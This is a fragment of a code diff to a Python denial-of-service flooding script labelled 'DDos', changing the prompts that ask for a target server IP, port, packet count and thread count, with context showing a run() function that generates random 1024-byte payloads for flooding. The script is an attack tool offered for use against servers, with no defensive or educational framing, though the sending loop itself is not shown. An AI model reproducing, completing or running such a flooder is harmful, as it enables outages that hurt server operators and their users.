@@ -49,11 +49,11 @@ else :
 owner do ddos:9chi7a
 
 print("DDos")
-ip= str(input("                   X Server ip X :"))
-port= int(input("                   X port X :"))
-choice = str(input("                   X DDoS Attack?? (y/n) X :"))
-times= int(input("                   X Paket X :"))
-threads= int(input("                   X threads X :"))
+ip= str(input("                    Server ip Mrx :"))
+port= int(input("                   port Mrx :"))
+choice = str(input("                    DDoS Attack?? (y/n) X :"))
+times= int(input("                    Paket Mrx  :"))
+threads= int(input("                    threads Mrx :"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[-]","[•]","[×]"))
